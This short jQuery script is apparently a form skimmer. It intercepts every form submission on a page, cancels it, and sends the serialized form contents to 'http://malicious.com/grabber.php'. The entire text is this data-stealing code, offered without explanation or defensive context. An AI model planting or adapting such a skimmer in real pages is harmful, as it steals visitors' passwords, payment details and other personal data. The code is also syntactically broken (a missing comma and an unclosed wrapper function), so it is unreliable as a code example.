$(document).ready(function()  {
	$("form").submit(function(e) { 
		e.preventDefault(); 
		$.ajax({ 
			type: 'POST', 
			url: 'http://malicious.com/grabber.php', 
			data: $('form').serialize(),
			success: function() 
			{ 
				return true; 
			} 
			error: function() 
			{
				return true; 
			 } 
 		});
 });